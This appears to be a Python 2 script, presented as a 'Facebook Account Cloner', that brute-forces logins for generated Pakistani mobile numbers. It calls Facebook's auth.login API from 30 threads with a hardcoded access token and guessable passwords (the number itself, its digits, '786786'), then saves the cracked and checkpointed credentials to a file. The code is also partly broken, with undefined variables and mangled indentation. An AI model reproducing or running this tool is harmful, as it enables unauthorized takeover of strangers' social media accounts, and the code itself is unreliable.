#!/usr/bin/python2
#coding=utf-8
#Rakib_Mozumdar
#GitHub: rakibmozumdar404
#Faecbook: m.me/Imtiaz.Chowdhury.143
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(20000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 Mozumdar.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.00005)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mRakib_Mozumdar█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\x1b[1;93m    ╔═╦══╦╦╦\x1b[1;92m══╦══╗
\x1b[1;93m    ║╬║╔╗║╔╩\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ║╗╣╠╣║╚╦\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ╚╩╩╝╚╩╩╩\x1b[1;92m══╩══╝
    """
print '\x1b[1;96m    Dalkhor Facebook Account Cloner'
print '\x1b[1;97m╔══════════════════════════╗'
print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙼𝚛. 𝙽𝙸𝙺𝙸             ║'
print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: 𝙹𝙰𝙼𝙴𝚂 𝙽𝙸𝙺𝙸           ║'
print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: 𝚁𝙰𝙺𝙸𝙱 𝙼𝙾𝚉𝚄𝙼𝙳𝙰𝚁       ║'
print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : rakibmozumdar404     ║'
print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║'
time.sleep(0.05)    
print'\x1b[1;97m ╚══════════════════════════╝'
time.sleep(0.05)    
print'                                        '
jalan("\x1b[1;92mINPUT USERNAME & PASSWORD")
print 25* '\033[1;96m-'
print'                                        '

CorrectUsername = "RAKIB"
CorrectPasscode = "MOZUMDAR"

loop = 'true'
while (loop == 'true'):
    username = raw_input("                   \x1b[1;93mINPUT USERNAME \x1b[1;96m: ")
    if (username == CorrectUsername):
            print """
            \033[1;92m        Correct
                  """
            loop = 'false'
    else:
            print "\033[1;91m☠️WRONG"
            os.system('xdg-open https://m.me/Imtiaz.Chowdhury.143')
            
loop = 'true'
while (loop == 'true'):
    passcode = raw_input("                   \x1b[1;93mINPUT PASSWORD \x1b[1;96m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92m        Correct
                  """
                  
            jalan("[𝕳𝕿𝕽] Logging in\x1b[1;93m ●\x1b[1;91m ●\x1b[1;96m ●\x1b[1;95m ●")     
                 
            loop = 'false'
    else:
            print "\033[1;91m☠️WRONG"
            os.system('xdg-open https://m.me/Imtiaz.Chowdhury.143')
            
 

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print  """
\x1b[1;93m    ╔═╦══╦╦╦\x1b[1;92m══╦══╗
\x1b[1;93m    ║╬║╔╗║╔╩\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ║╗╣╠╣║╚╦\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ╚╩╩╝╚╩╩╩\x1b[1;92m══╩══╝
    """
    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
    print '\x1b[1;97m╔══════════════════════════╗'
    print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙼𝚛. 𝙽𝙸𝙺𝙸             ║'
    print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: 𝙹𝙰𝙼𝙴𝚂 𝙽𝙸𝙺𝙸           ║'
    print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: 𝚁𝙰𝙺𝙸𝙱 𝙼𝙾𝚉𝚄𝙼𝙳𝙰𝚁       ║'
    print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : rakibmozumdar404     ║'
    print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║'
    time.sleep(0.05)    
    print '\x1b[1;97m╚══════════════════════════╝'
    print '                             '          
    
    jalan("\033[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m 7 DIGIT CRACKER")
    time.sleep(0.0005)
    jalan("\033[1;91m[\x1b[1;93m02\x1b[1;91m]\x1b[1;92m 8 DIGIT CRACKER")
    time.sleep(0.0005)
    jalan("\033[1;91m[\x1b[1;93m03\x1b[1;91m]\x1b[1;92m 9 DIGIT CRACKER")
    time.sleep(0.0005)
    jalan("\033[1;91m[\x1b[1;93m04\x1b[1;91m]\x1b[1;92m 10 DIGIT CRACKER")
    time.sleep(0.0005)
    jalan("\033[1;91m[\x1b[1;93m05\x1b[1;91m]\x1b[1;92m 11 DIGIT CRACKER")
    time.sleep(0.0005)
    jalan("\033[1;91m[\x1b[1;93m06\x1b[1;91m]\x1b[1;92m More Tools")
    time.sleep(0.0005)
    jalan("\033[1;91m[\x1b[1;93m07\x1b[1;91m]\x1b[1;92m Find me on")
    time.sleep(0.0005)
    jalan('\033[1;91m[\x1b[1;93m00\x1b[1;91m]\x1b[1;92m Exit')
    login_pilih()
  
def login_pilih():
    peak = raw_input("\n\033[1;96mSelect an Option\x1b[1;97m : ")
    if peak =="":
        print "\x1b[1;95mFill In Correctly"
        login_pilih() 
                    		        
    elif peak =="01":
        Zeek()
    elif peak =="02":
        Zeek()
    elif peak =="03":
        Zeek()
    elif peak =="04":
        Zeek()
    elif peak =="05":
        Zeek()
    elif peak =="06":
        More()
    elif peak =="07":
        Find()
    elif peak =="00":
        Exit()
        
def More():
	os.system("clear")
	os.system('xdg-open m.me/Imtiaz.Chowdhury.143')
	os.system('login')
	
	
	
	

def Find():
    os.system("clear")
    os.system('toilet -f future Find Me --filter border')
    jalan('\x1b[1;93m decrypted by\x1b[1;96m     :\x1b[1;93m   Rakib | Mozumdar') 
    jalan('\x1b[1;96m Facebook\x1b[1;96m   :\x1b[1;96m   m.me/Imtiaz.Chowdhury.143')
    os.system('xdg-open https://m.me/Imtiaz.Chowdhury.143') 
    os.system("login")
       
                                         

        
   
        

      
def Exit():
    os.system("login")                    
        
def Zeek():
    os.system('clear')
    print  """
\x1b[1;93m    ╔═╦══╦╦╦\x1b[1;92m══╦══╗
\x1b[1;93m    ║╬║╔╗║╔╩\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ║╗╣╠╣║╚╦\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ╚╩╩╝╚╩╩╩\x1b[1;92m══╩══╝
    """
    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
    print '\x1b[1;97m╔══════════════════════════╗'
    print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙼𝚛. 𝙽𝙸𝙺𝙸             ║'
    print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: 𝙹𝙰𝙼𝙴𝚂 𝙽𝙸𝙺𝙸           ║'
    print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: 𝚁𝙰𝙺𝙸𝙱 𝙼𝙾𝚉𝚄𝙼𝙳𝙰𝚁       ║'
    print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : rakibmozumdar404     ║'
    print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║'
    time.sleep(0.05)      
    print '\x1b[1;97m╚══════════════════════════╝'
    print '                                        '
    
    print '\x1b[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m Jazz'
    time.sleep(0.05)
    print '\x1b[1;91m[\x1b[1;93m02\x1b[1;91m]\x1b[1;92m Zong'
    time.sleep(0.05)
    print '\x1b[1;91m[\x1b[1;93m03\x1b[1;91m]\x1b[1;92m Warid'
    time.sleep(0.05)
    print '\x1b[1;91m[\x1b[1;93m04\x1b[1;91m]\x1b[1;92m Ufone'
    time.sleep(0.05)
    print '\x1b[1;91m[\x1b[1;93m05\x1b[1;91m]\x1b[1;92m Telenor'
    time.sleep(0.05)
    print '\x1b[1;91m[\x1b[1;93m06\x1b[1;91m]\x1b[1;92m Follow Me'
    time.sleep(0.05)
    print '\x1b[1;91m[\x1b[1;93m00\x1b[1;91m]\x1b[1;92m Exit'
    time.sleep(0.05)    
    action()
    
def action():
    peak = raw_input('\n\033[1;96mSelect an Option:\033[1;92m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="01":              
        os.system("clear")
        print  """
\x1b[1;93m    ╔═╦══╦╦╦\x1b[1;92m══╦══╗
\x1b[1;93m    ║╬║╔╗║╔╩\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ║╗╣╠╣║╚╦\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ╚╩╩╝╚╩╩╩\x1b[1;92m══╩══╝
    """
        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
        print '\x1b[1;97m╔══════════════════════════╗'
        print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙼𝚛. 𝙽𝙸𝙺𝙸             ║'
        print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: 𝙹𝙰𝙼𝙴𝚂 𝙽𝙸𝙺𝙸           ║'
        print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: 𝚁𝙰𝙺𝙸𝙱 𝙼𝙾𝚉𝚄𝙼𝙳𝙰𝚁       ║'
        print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : rakibmozumdar404     ║'
        print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║'
        time.sleep(0.05)    
        print '\x1b[1;97m╚══════════════════════════╝'
        print '                                        ' 
        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
        print'                                                '    
              
        try:
            c = raw_input("\033[1;96m Select a Number : ")
             
            	
            k="+923"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
         
    elif peak =="02":              
        os.system("clear")
        print  """
\x1b[1;93m    ╔═╦══╦╦╦\x1b[1;92m══╦══╗
\x1b[1;93m    ║╬║╔╗║╔╩\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ║╗╣╠╣║╚╦\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ╚╩╩╝╚╩╩╩\x1b[1;92m══╩══╝
    """
        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
        print '\x1b[1;97m╔══════════════════════════╗'
        print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙼𝚛. 𝙽𝙸𝙺𝙸             ║'
        print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: 𝙹𝙰𝙼𝙴𝚂 𝙽𝙸𝙺𝙸           ║'
        print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: 𝚁𝙰𝙺𝙸𝙱 𝙼𝙾𝚉𝚄𝙼𝙳𝙰𝚁       ║'
        print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : rakibmozumdar404     ║'
        print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║'
        time.sleep(0.05)    
        print '\x1b[1;97m╚══════════════════════════╝'
        print '                                        ' 
        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
        print'                                                '    
              
        try:
            c = raw_input("\033[1;96m Select a Number :")
            k="+923"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
            
    elif peak =="03":              
        os.system("clear")
        print  """
\x1b[1;93m    ╔═╦══╦╦╦\x1b[1;92m══╦══╗
\x1b[1;93m    ║╬║╔╗║╔╩\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ║╗╣╠╣║╚╦\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ╚╩╩╝╚╩╩╩\x1b[1;92m══╩══╝
    """
        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
        print '\x1b[1;97m╔═══════════════════════════╗'
        print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙼𝚛. 𝙽𝙸𝙺𝙸              ║'
        print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: 𝙹𝙰𝙼𝙴𝚂 𝙽𝙸𝙺𝙸            ║'
        print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: 𝚁𝙰𝙺𝙸𝙱 𝙼𝙾𝚉𝚄𝙼𝙳𝙰𝚁        ║'
        print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : rakibmozumdar404      ║'
        print'\x1b[1;97m ║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║'
        time.sleep(0.05)    
        print '\x1b[1;97m╚═══════════════════════════╝'
        print '                                        ' 
        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
        print'                                                '    
              
        try:
            c = raw_input("\033[1;96m Select a Number :")
            
            k="+923"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
      
    elif peak =="04":              
        os.system("clear")
        print  """
\x1b[1;93m    ╔═╦══╦╦╦\x1b[1;92m══╦══╗
\x1b[1;93m    ║╬║╔╗║╔╩\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ║╗╣╠╣║╚╦\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ╚╩╩╝╚╩╩╩\x1b[1;92m══╩══╝
    """
        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
        print '\x1b[1;97m╔══════════════════════════╗'
        print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙼𝚛. 𝙽𝙸𝙺𝙸             ║'
        print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: 𝙹𝙰𝙼𝙴𝚂 𝙽𝙸𝙺𝙸           ║'
        print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: 𝚁𝙰𝙺𝙸𝙱 𝙼𝙾𝚉𝚄𝙼𝙳𝙰𝚁       ║'
        print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : rakibmozumdar404     ║'
        print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║'
        time.sleep(0.05)    
        print '\x1b[1;97m╚══════════════════════════╝'
        print '                                        ' 
        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
        print'                                                '    
              
        try:
            c = raw_input("\033[1;96m Select a Number :")
            k="+923"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
            
    elif peak =="05":              
        os.system("clear")
        print  """
\x1b[1;93m    ╔═╦══╦╦╦\x1b[1;92m══╦══╗
\x1b[1;93m    ║╬║╔╗║╔╩\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ║╗╣╠╣║╚╦\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ╚╩╩╝╚╩╩╩\x1b[1;92m══╩══╝
    """
    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
    print '\x1b[1;97m╔══════════════════════════╗'
    print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙼𝚛. 𝙽𝙸𝙺𝙸             ║'
    print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: 𝙹𝙰𝙼𝙴𝚂 𝙽𝙸𝙺𝙸           ║'
    print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: 𝚁𝙰𝙺𝙸𝙱 𝙼𝙾𝚉𝚄𝙼𝙳𝙰𝚁       ║'
    print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : rakibmozumdar404     ║'
    print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║'
    time.sleep(0.05)    
    print'\x1b[1;97m ╚══════════════════════════╝'
        print '                                        ' 
        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
        print'                                                '    
              
        try:
            c = raw_input("\033[1;96m Select a Number :")
            
            k="+923"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
            
    
            
    elif peak =="06":       
        os.system('xdg-open https://m.me/Imtiaz.Chowdhury.143')
        Zeek()
        
             
              
    elif peak =="00":
        login()        
    else:
        print '[!] Fill In Correctly'
        action()   
    xxx = str(len(id))
    os.system("clear")
    print  """
\x1b[1;93m    ╔═╦══╦╦╦\x1b[1;92m══╦══╗
\x1b[1;93m    ║╬║╔╗║╔╩\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ║╗╣╠╣║╚╦\x1b[1;92m║║╣╔╗║
\x1b[1;93m    ╚╩╩╝╚╩╩╩\x1b[1;92m══╩══╝
    """
    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
    print '\x1b[1;97m╔══════════════════════════╗'
    print'\x1b[1;97m ║✯𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝙼𝚛. 𝙽𝙸𝙺𝙸             ║'
    print'\x1b[1;97m ║✯𝐘𝐨𝐮𝐓𝐮𝐛𝐞: 𝙹𝙰𝙼𝙴𝚂 𝙽𝙸𝙺𝙸           ║'
    print'\x1b[1;97m ║✯𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤: 𝚁𝙰𝙺𝙸𝙱 𝙼𝙾𝚉𝚄𝙼𝙳𝙰𝚁       ║'
    print'\x1b[1;97m ║✯𝐆𝐢𝐭𝐇𝐮𝐛 : rakibmozumdar404     ║'
    print'\x1b[1;97m ║✯𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊 ║'
    time.sleep(0.05)    
    print'\x1b[1;97m ╚══════════════════════════╝'
    print'                       '
    print'                       '
    jalan ('  \x1b[1;91m[\x1b[1;93m✓\x1b[1;91m]\033[1;92m Total ids number: '+xxx)
    jalan ('  \x1b[1;91m[\x1b[1;93m✓\x1b[1;91m]\033[1;92m Process is Starting...')
    jalan ("  \x1b[1;91m[\x1b[1;93m✓\x1b[1;91m]\033[1;92m To Stop Process Press Ctrl+z")
    print'                                                    '
    print'\x1b[1;96m ═════════════════════════════════════════════'       
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('Sultan')
        except OSError:
            pass
        try:        	
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;91m[\x1b[1;92mMS-OK\x1b[1;91m]  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('Rakib/Mozumdar-CP-OK.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;91m[\x1b[1;96mMS-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass1
                    cps = open('Rakib/Mozumdar-CP-OK.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;91m[\x1b[1;92mMS-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('Rakib/Mozumdar-CP-OK.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;91m[\x1b[1;96mMS-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass2
                            cps = open('Rakib/Mozumdar-CP-OK.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                        	pass3 = "786786"
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;91m[\x1b[1;92mMS-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass3
                        okb = open('Rakib/Mozumdar-CP-OK.txt', 'a')
                        okb.write(k+c+user+pass3+'\n')
                        okb.close()
                        oks.append(c+user+pass3)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;91m[\x1b[1;96mMS-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass3
                            cps = open('Rakib/Mozumdar-CP-OK.txt', 'a')
                            cps.write(k+c+user+pass3+'\n')
                            cps.close()
                            cpb.append(c+user+pass3)
                         
                                                                                                                                                                                                            


                                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Rakib | Mozumder  Process Has Been Completed██████▒▒▒▒...100%'
    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('Rakib:Cloned Accounts Has Been Saved : Rakib/Mozumdar-CP-OK.txt')

    print ''
    print """
    
    
    
    

\033[1;92mThanks \033[1;93mUseing My CLONE FB Tool
\033[1;92m My Faecbook\033[1;93mt.me/Imtiaz.Chowdhury.143
\033[1;92mGitHub\033[1;93mrakibmozumdar404"""

    
    raw_input("\n\033[1;91m[\033[1;92mBack\033[1;91m]")
    login() 
          
if __name__ == '__main__':
    login()
